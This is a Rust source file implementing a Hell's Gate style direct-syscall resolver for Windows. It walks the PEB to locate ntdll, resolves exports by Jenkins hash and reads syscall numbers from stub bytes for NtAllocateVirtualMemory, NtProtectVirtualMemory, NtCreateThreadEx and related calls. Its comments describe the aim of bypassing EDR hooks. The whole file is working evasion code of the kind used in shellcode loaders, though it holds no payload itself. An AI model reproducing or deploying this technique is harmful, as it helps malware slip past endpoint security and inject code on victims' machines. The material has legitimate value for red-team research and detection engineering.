use core::ffi::{c_ulong, c_void};
use std::{collections::HashMap, os::raw::c_char};

use crate::util::{peb::New, common::JenkinsOATHash};
use windows::Win32::System::{
    Diagnostics::Debug::IMAGE_NT_HEADERS64,
    SystemServices::{
        IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_EXPORT_DIRECTORY, IMAGE_NT_SIGNATURE,
    },
    Threading::PEB,
    WindowsProgramming::LDR_DATA_TABLE_ENTRY,
};

// syscall setup instruction bytes for comparison
const SYSCALL_OPCODE: [u8; 6] = [0x4c, 0x8b, 0xd1, 0xb8, 0x00, 0x00];

#[derive(Debug)]
pub struct VxTableEntry {
    pub p_address: *const c_void,
    pub u_hash: u32,
    pub w_system_call: u32,
}

impl VxTableEntry {
    pub unsafe fn new(syscall_hash: u32, syscall_map: &HashMap<u32, u64>) -> Option<Self> {
        // match function address to its name hash
        let p_address = match syscall_map.get(&syscall_hash) {
            Some(val) => val.to_owned(),
            None => panic!(
                "[x] requested function '0x{:08x?}' wasn't retrieved when binding function map.",
                syscall_hash
            ),
        };

        // tests for hooked functions using the instruction bytes and attempts to skip to the
        // syscall if unexpected instructions are found; we would expect to see the following
        // instructions at the address passed to this function:
        // ```
        //  mov r10, rcx
        //  mov eax, [syscall address]
        // ```
        //
        // ... which translates to the shellcode:
        // ```
        //  4C 8B D1
        //  B8 [?? ??] 00 00
        // ```
        // generally speaking, this shouldn't occur unless a security solution (e.g EDR)
        // is present on the target system, in which case this is realistically a best-effort
        // hack, and this bypass method is probably not viable anyway.
        let mut cw = 0u16;
        let w_system_call;

        loop {
            // [0x0f, 0x05] indicates the `jmp ...` instruction after the syscall setup
            let offset_a = *((p_address + cw as u64) as *const u8);
            let offset_b = *((p_address + 1 + cw as u64) as *const u8);
            if offset_a == 0x0f && offset_b == 0x05 {
                println!(
                    "[x] seems too far (offset_a == 0x0f || offset_b == 0x05) @ byte index '{}'.",
                    cw
                );
                return None;
            }

            // `0xc3` indicates `ret` instruction
            if offset_a == 0xc3 {
                println!("[x] seems too far (offset_a == 0xc3) @ byte index '{}'.", cw);
                return None;
            }

            // check whether the current iteration contains the
            // syscall setup opcodes
            // ```
            // mov r10, rcx
            // mov eax, [syscall]
            // ```
            let fn_bytes: [u8; 6] = [
                *((p_address + cw as u64) as *const u8),
                *((p_address + 1 + cw as u64) as *const u8),
                *((p_address + 2 + cw as u64) as *const u8),
                *((p_address + 3 + cw as u64) as *const u8),
                *((p_address + 6 + cw as u64) as *const u8),
                *((p_address + 7 + cw as u64) as *const u8),
            ];

            if fn_bytes == SYSCALL_OPCODE {
                // if this is the syscall setup, retrieve and return the
                // syscall SSN
                let high = *((p_address + 5 + cw as u64) as *const u8);
                let low = *((p_address + 4 + cw as u64) as *const u8);
                w_system_call = (high.wrapping_shl(8) | low) as u32;

                break;
            }

            // otherwise, increment offset by 1 byte and repeat
            cw += 1;
        }
        return Some(VxTableEntry {
            p_address: p_address as *const c_void,
            u_hash: syscall_hash,
            w_system_call,
        });
    }
}


// this (plus the function name hashes) needs to change depending on what
// syscalls are required
#[derive(Debug)]
pub struct VxTable {
    pub nt_create_thread_ex: VxTableEntry,
    pub nt_protect_virtual_memory: VxTableEntry,
    pub nt_allocate_virtual_memory: VxTableEntry,
    pub nt_wait_for_single_object: VxTableEntry,
    pub nt_close: VxTableEntry,
}

impl VxTable {
    // performs a single walk through the module's exports to map a function's hashed name to its address:
    // iterate through a given module's export directory; those functions whose name's hash is a value in the
    // `SYSCALL_HASHES` array slice have their address inserted into the `matches` hashmap which we return to
    // the caller after the iterator is exhausted.
    pub unsafe fn get_syscall_map(
        p_img_export_dir: IMAGE_EXPORT_DIRECTORY,
        p_module_base: u64,
        syscall_array: &Vec<u32>,
    ) -> HashMap<u32, u64> {
        // buffer to store hash/address/SSN of syscall
        let mut matches = HashMap::new();

        let p_addr_functions = (p_img_export_dir.AddressOfFunctions) as u64;
        let p_addr_names = p_module_base + (p_img_export_dir.AddressOfNames) as u64;
        let p_addr_ordinals = p_module_base + (p_img_export_dir.AddressOfNameOrdinals) as u64;

        // iterate over function list in a given module
        for i in 0..p_img_export_dir.NumberOfFunctions - 1 {
            let p_func_name = *(p_addr_names as *const c_ulong).add(i as usize);
            let fn_name = match std::ffi::CStr::from_ptr(
                (p_module_base + p_func_name as u64) as *const c_char,
            )
            .to_str()
            {
                Ok(name) => name,
                Err(_) => continue,
            };

            let p_ordinal = *(p_addr_ordinals as *const u16).add(i as usize);
            let fn_hash = JenkinsOATHash::from_str(fn_name);

            // check if hashed function name is in our syscall array
            if syscall_array.contains(&fn_hash.hash) {
                let address =
                    ((p_module_base + p_addr_functions) as *const u32).add(p_ordinal as usize);

                let res: unsafe extern "system" fn() -> isize =
                    { std::mem::transmute(((*address) as u64 + p_module_base) as *const u32) };

                // i would imagine `(entry).or_insert_with(...)` is probably redundant here 
                // but it is what it is for now
                matches.entry(fn_hash.hash).or_insert_with(|| res as u64); 
            }
        }
        return matches;
    }

    // determines the address of the EAT for a given module by following nested struct fields
    // in the module header
    pub unsafe fn get_image_export_dir(p_module_base: u64) -> Option<IMAGE_EXPORT_DIRECTORY> {
        let p_dos_header = p_module_base as *const IMAGE_DOS_HEADER;
        if (*p_dos_header).e_magic != IMAGE_DOS_SIGNATURE {
            return None;
        }
        let p_nt_header =
            (p_module_base + ((*p_dos_header).e_lfanew as u64)) as *const IMAGE_NT_HEADERS64;
        if (*p_nt_header).Signature != IMAGE_NT_SIGNATURE {
            return None;
        }
        let p_export_dir = (p_module_base
            + ((*p_nt_header).OptionalHeader.DataDirectory[0].VirtualAddress) as u64)
            as *const IMAGE_EXPORT_DIRECTORY;

        return Some(*p_export_dir);
    }

    pub unsafe fn new(syscall_array: Vec<u32>) -> Self {
        // grab address of ProcessEnvironmentBlock via GS register offset method
        let peb = PEB::new();   

        // retrieve the base address of `ntdll.dll` (kind of hacky but seems reliable enough)
        let p_ldr_data_entry = (*(*peb.Ldr).InMemoryOrderModuleList.Flink).Flink as u64 - 0x10;
        let p_module_base = (*(p_ldr_data_entry as *const LDR_DATA_TABLE_ENTRY)).DllBase as u64;

        // retrieve a hashmap containing the details of the syscalls we want using the export
        // directory of our NTDLL
        let p_image_export_dir = Self::get_image_export_dir(p_module_base).unwrap();
        let module_map = Self::get_syscall_map(p_image_export_dir, p_module_base, &syscall_array);

        // use the module map to create new table entries for each of our required syscalls
        let nt_close = VxTableEntry::new(syscall_array[0], &module_map).unwrap();
        let nt_create_thread_ex = VxTableEntry::new(syscall_array[1], &module_map).unwrap();
        let nt_wait_for_single_object = VxTableEntry::new(syscall_array[2], &module_map).unwrap();
        let nt_allocate_virtual_memory = VxTableEntry::new(syscall_array[3], &module_map).unwrap();
        let nt_protect_virtual_memory = VxTableEntry::new(syscall_array[4], &module_map).unwrap();

        return Self {
            nt_close,
            nt_allocate_virtual_memory,
            nt_create_thread_ex,
            nt_protect_virtual_memory,
            nt_wait_for_single_object,
        };
    }
}
